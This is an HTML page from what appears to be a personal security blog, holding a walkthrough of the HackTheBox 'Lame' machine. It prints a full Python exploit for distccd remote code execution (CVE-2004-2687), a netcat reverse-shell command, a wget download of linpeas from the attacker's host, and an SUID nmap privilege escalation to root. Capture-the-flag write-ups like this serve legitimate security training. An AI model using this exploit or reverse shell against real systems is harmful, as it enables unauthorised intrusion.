@@ -1,0 +1,275 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Lame | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Lame from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/7_lame/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Lame</h1> <p class="post-description">Lame from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/lame/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Lame Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/machines/Lame" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Here we are for a blast from the past. Looking at Lame from HackTheBox.</p> <p>As a start, get the open ports by running nmap.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.10.3
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-17 04:52 CST
+Nmap scan report <span class="k">for </span>10.10.10.3
+Host is up <span class="o">(</span>0.098s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.29
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span class="o">(</span>DSA<span class="o">)</span>
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span class="o">(</span>RSA<span class="o">)</span>
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+
+&lt;snip&gt;
+
+</code></pre></div></div> <p><br> Run nmap again to scan all of the ports to find any hidden services.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-oN</span> nmapfull 10.10.10.3
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-17 04:53 CST
+Nmap scan report <span class="k">for </span>10.10.10.3
+Host is up <span class="o">(</span>0.098s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65530 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3632/tcp open  distccd
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>224.07 seconds
+
+</code></pre></div></div> <p><br> Google distccd to try and figure our what it is. I have never seen it before.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Distcc is a program designed to distribute compiling tasks across a network to participating hosts.
+</code></pre></div></div> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/lame/gentoo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Gentoo Distcc" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://wiki.gentoo.org/wiki/Distcc#:~:text=Distcc%20is%20a%20program%20designed,a%20small%20amount%20of%20setup." rel="external nofollow noopener" target="_blank">Source</a></p> <p><br> Google distccd v1 to see if there are any exploits for it.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/lame/googleit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Google It" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Click on the GitHub gist from DarkCoderSc that has an exploit that we can use.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/lame/exploit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="GitHub Exploit" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855" rel="external nofollow noopener" target="_blank">Exploit</a></p> <p><br> Update the exploit to change the strings that the sockets accept to bytes-like object. Sockets no longer accept strings.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'''
+	distccd v1 RCE (CVE-2004-2687)
+	
+	This exploit is an updated version of the python script here:
+		https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855
+
+	Socket takes a bytes-like object and not a string.
+
+	Lame Box (HTB):
+		local&gt;nc -lvp 1403
+
+		local&gt;./disccd_exploit.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 1403 -e /bin/sh"	
+
+		Enjoy your shell
+'''</span>
+
+import socket
+import string
+import random
+import argparse
+
+<span class="s1">'''
+	Generate a random alpha num string (Evade some signature base detection?)
+'''</span>
+def rand_text_alphanumeric<span class="o">(</span>len<span class="o">)</span>:
+	str <span class="o">=</span> b<span class="s1">''</span>
+	<span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>len<span class="o">)</span>:
+		str +<span class="o">=</span> random.choice<span class="o">(</span>string.ascii_letters + string.digits<span class="o">)</span>.encode<span class="o">(</span><span class="s1">'UTF-8'</span><span class="o">)</span>
+
+	<span class="k">return </span>str
+
+<span class="s1">'''
+	Read STDERR / STDOUT returned by remote service.
+'''</span>
+def read_std<span class="o">(</span>s<span class="o">)</span>:
+	s.recv<span class="o">(</span>4<span class="o">)</span> <span class="c"># Ignore</span>
+
+	len <span class="o">=</span> int<span class="o">(</span>s.recv<span class="o">(</span>8<span class="o">)</span>, 16<span class="o">)</span> <span class="c"># Get output length</span>
+
+	<span class="k">if </span>len <span class="o">!=</span> 0:
+		<span class="k">return </span>s.recv<span class="o">(</span>len<span class="o">)</span>
+
+<span class="s1">'''
+	Trigger Exploit
+'''</span>
+def exploit<span class="o">(</span><span class="nb">command</span>, host, port<span class="o">)</span>:
+    args <span class="o">=</span> <span class="o">[</span><span class="s2">"sh"</span>, <span class="s2">"-c"</span>, <span class="nb">command</span>, <span class="s2">"#"</span>, <span class="s2">"-c"</span>, <span class="s2">"main.c"</span>, <span class="s2">"-o"</span>, <span class="s2">"main.o"</span><span class="o">]</span>
+
+    payload <span class="o">=</span> <span class="s2">"DIST00000001"</span> + <span class="s2">"ARGC%.8x"</span> % len<span class="o">(</span>args<span class="o">)</span>
+    <span class="k">for </span>arg <span class="k">in </span>args:
+        payload +<span class="o">=</span> <span class="s2">"ARGV%.8x%s"</span> % <span class="o">(</span>len<span class="o">(</span>arg<span class="o">)</span>, arg<span class="o">)</span>
+
+    payload <span class="o">=</span> payload.encode<span class="o">(</span><span class="s1">'UTF-8'</span><span class="o">)</span>
+
+    s <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="o">)</span>
+
+    socket.setdefaulttimeout<span class="o">(</span>5<span class="o">)</span>
+    s.settimeout<span class="o">(</span>5<span class="o">)</span>
+    <span class="k">if </span>s.connect_ex<span class="o">((</span>host, port<span class="o">))</span> <span class="o">==</span> 0:
+        print<span class="o">(</span><span class="s2">"[</span><span class="se">\0</span><span class="s2">33[32mOK</span><span class="se">\0</span><span class="s2">33[39m] Connected to remote service"</span><span class="o">)</span>
+        try:
+            s.send<span class="o">(</span>payload<span class="o">)</span>
+
+            dtag <span class="o">=</span> b<span class="s2">"DOTI0000000A"</span> + rand_text_alphanumeric<span class="o">(</span>10<span class="o">)</span>
+
+            s.send<span class="o">(</span>dtag<span class="o">)</span>
+
+            s.recv<span class="o">(</span>24<span class="o">)</span>
+
+            print<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">--- BEGIN BUFFER ---</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+
+            buff <span class="o">=</span> read_std<span class="o">(</span>s<span class="o">)</span> <span class="c"># STDERR</span>
+            <span class="k">if </span>buff:
+                print<span class="o">(</span>buff<span class="o">)</span>
+
+            buff <span class="o">=</span> read_std<span class="o">(</span>s<span class="o">)</span> <span class="c"># STDOUT</span>
+            <span class="k">if </span>buff:
+                print<span class="o">(</span>buff<span class="o">)</span>
+
+            print<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">--- END BUFFER ---</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+
+            print<span class="o">(</span><span class="s2">"[</span><span class="se">\0</span><span class="s2">33[32mOK</span><span class="se">\0</span><span class="s2">33[39m] Done."</span><span class="o">)</span>
+        except socket.timeout:
+            print<span class="o">(</span><span class="s2">"[</span><span class="se">\0</span><span class="s2">33[31mKO</span><span class="se">\0</span><span class="s2">33[39m] Socket Timeout"</span><span class="o">)</span>
+        except socket.error:
+            print<span class="o">(</span><span class="s2">"[</span><span class="se">\0</span><span class="s2">33[31mKO</span><span class="se">\0</span><span class="s2">33[39m] Socket Error"</span><span class="o">)</span>
+        except Exception as error:
+            print<span class="o">(</span><span class="s2">"[</span><span class="se">\0</span><span class="s2">33[31mKO</span><span class="se">\0</span><span class="s2">33[39m] Exception Raised"</span>, error<span class="o">)</span>
+        finally:
+            s.close<span class="o">()</span>		
+    <span class="k">else</span>:
+        print<span class="o">(</span><span class="s2">"[</span><span class="se">\0</span><span class="s2">33[31mKO</span><span class="se">\0</span><span class="s2">33[39m] Failed to connect to %s on port %d"</span> % <span class="o">(</span>host, port<span class="o">))</span>
+
+
+parser <span class="o">=</span> argparse.ArgumentParser<span class="o">(</span><span class="nv">description</span><span class="o">=</span><span class="s1">'DistCC Daemon - Command Execution (Metasploit)'</span><span class="o">)</span>
+
+parser.add_argument<span class="o">(</span><span class="s1">'-t'</span>, <span class="nv">action</span><span class="o">=</span><span class="s2">"store"</span>, <span class="nv">dest</span><span class="o">=</span><span class="s2">"host"</span>, <span class="nv">required</span><span class="o">=</span>True, <span class="nb">help</span><span class="o">=</span><span class="s2">"Target IP/HOST"</span><span class="o">)</span>
+parser.add_argument<span class="o">(</span><span class="s1">'-p'</span>, <span class="nv">action</span><span class="o">=</span><span class="s2">"store"</span>, <span class="nb">type</span><span class="o">=</span>int, <span class="nv">dest</span><span class="o">=</span><span class="s2">"port"</span>, <span class="nv">default</span><span class="o">=</span>3632, <span class="nb">help</span><span class="o">=</span><span class="s2">"DistCCd listening port"</span><span class="o">)</span>
+parser.add_argument<span class="o">(</span><span class="s1">'-c'</span>, <span class="nv">action</span><span class="o">=</span><span class="s2">"store"</span>, <span class="nv">dest</span><span class="o">=</span><span class="s2">"command"</span>, <span class="nv">default</span><span class="o">=</span><span class="s2">"id"</span>, <span class="nb">help</span><span class="o">=</span><span class="s2">"Command to run on target system"</span><span class="o">)</span>
+
+try:
+	argv <span class="o">=</span> parser.parse_args<span class="o">()</span>
+
+	exploit<span class="o">(</span>argv.command, argv.host, argv.port<span class="o">)</span>
+except IOError:
+	parse.error
+
+</code></pre></div></div> <p><br> Review the NIST entry that discusses this particular vulnerability.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/lame/nist.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="NIST" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://nvd.nist.gov/vuln/detail/cve-2004-2687" rel="external nofollow noopener" target="_blank">Vulnerability</a></p> <p><br> Start a listener listening on 1403.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 1403
+listening on <span class="o">[</span>any] 1403 ...
+</code></pre></div></div> <p><br> Run the payload. Execute a reverse shell connecting to the attack machine on the port from the listener sending /bin/sh.</p> <ul> <li>-t rhost</li> <li>-p rport</li> <li>-c command</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>python ./exploit_upd.py <span class="nt">-t</span> 10.10.10.3 <span class="nt">-p</span> 3632 <span class="nt">-c</span> <span class="s2">"nc 10.10.14.29 1403 -e /bin/sh"</span>
+<span class="o">[</span>OK] Connected to remote service
+<span class="o">[</span>KO] Socket Timeout
+</code></pre></div></div> <p><br> Check the listener and catch the shell. Upgrade the shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 1403
+listening on <span class="o">[</span>any] 1403 ...
+connect to <span class="o">[</span>10.10.14.29] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.3] 49941
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+daemon@lame:/tmp<span class="err">$</span>
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@lame:/home/makis<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+&lt;redacted&gt;
+daemon@lame:/home/makis<span class="nv">$ </span>ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:a6:d6  
+          inet addr:10.10.10.3  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: dead:beef::250:56ff:feb9:a6d6/64 Scope:Global
+          inet6 addr: fe80::250:56ff:feb9:a6d6/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:138167 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:8488768 <span class="o">(</span>8.0 MB<span class="o">)</span>  TX bytes:152340 <span class="o">(</span>148.7 KB<span class="o">)</span>
+          Interrupt:19 Base address:0x2024 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:1284 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1284 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:597781 <span class="o">(</span>583.7 KB<span class="o">)</span>  TX bytes:597781 <span class="o">(</span>583.7 KB<span class="o">)</span>
+</code></pre></div></div> <p><br> Lookup Linpeas. Linpeas, if you don’t know, is a scripts that will perform a number of checks for privilege escalation and highlight the likely path to privesc.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/lame/linpeas.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="linpeas.sh" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20250113-4426d62e" rel="external nofollow noopener" target="_blank">Linpeas GitHub</a></p> <p><br> Download the script to your working folder. Start a python webserver to serve the script. Transfer the script to the victim machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@lame:/dev/shm<span class="nv">$ </span>wget 10.10.14.29:8000/linpeas.sh
+wget 10.10.14.29:8000/linpeas.sh
+<span class="nt">--07</span>:27:04--  http://10.10.14.29:8000/linpeas.sh
+           <span class="o">=&gt;</span> <span class="sb">`</span>linpeas.sh<span class="s1">'
+Connecting to 10.10.14.29:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 830,426 (811K) [text/x-sh]
+
+100%[====================================&gt;] 830,426        1.01M/s             
+
+07:27:05 (1.01 MB/s) - `linpeas.sh'</span> saved <span class="o">[</span>830426/830426]
+
+daemon@lame:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x linpeas.sh                                                             
+<span class="nb">chmod</span> +x linpeas.sh
+</code></pre></div></div> <p><br> Run the linpeas script. Notice that nmap has the sticky bit.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@lame:/dev/shm<span class="nv">$ </span>./linpeas.sh
+./linpeas.sh
+
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+&lt;snip&gt;
+
+<span class="nt">-rwsr-xr-x</span> 1 root root 28K Apr  2  2008 /usr/bin/chfn  <span class="nt">---</span><span class="o">&gt;</span>  SuSE_9.3/10
+<span class="nt">-rwsr-xr-x</span> 1 root root 763K Apr  8  2008 /usr/bin/nmap
+<span class="nt">-rwsr-xr-x</span> 1 root root 24K Apr  2  2008 /usr/bin/chsh
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Lookup the GTFOBins for nmap to get a sense of how we can abuse it.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/lame/gtfobins.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="GTFOBinss" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://gtfobins.github.io/gtfobins/nmap/#suid" rel="external nofollow noopener" target="_blank">GTFOBins</a></p> <p><br> Enter nmap interactive mode and use !sh to enter a shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@lame:/dev/shm<span class="nv">$ </span>nmap <span class="nt">--interactive</span>
+nmap <span class="nt">--interactive</span>
+
+Starting Nmap V. 4.53 <span class="o">(</span> http://insecure.org <span class="o">)</span>
+Welcome to Interactive Mode <span class="nt">--</span> press h &lt;enter&gt; <span class="k">for </span><span class="nb">help
+</span>nmap&gt; <span class="o">!</span>sh
+<span class="o">!</span>sh
+sh-3.2# <span class="nb">whoami
+whoami
+</span>root
+</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh-3.2# <span class="nb">cat</span> /root/root.txt
+<span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+sh-3.2# ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:a6:d6  
+          inet addr:10.10.10.3  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: dead:beef::250:56ff:feb9:a6d6/64 Scope:Global
+          inet6 addr: fe80::250:56ff:feb9:a6d6/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:140134 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2006 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:9497002 <span class="o">(</span>9.0 MB<span class="o">)</span>  TX bytes:351762 <span class="o">(</span>343.5 KB<span class="o">)</span>
+          Interrupt:19 Base address:0x2024 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:1685 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1685 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:798921 <span class="o">(</span>780.1 KB<span class="o">)</span>  TX bytes:798921 <span class="o">(</span>780.1 KB<span class="o">)</span>
+</code></pre></div></div> <p><br> Thank you so much for reading. Hopefully my post wasn’t too lame.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer 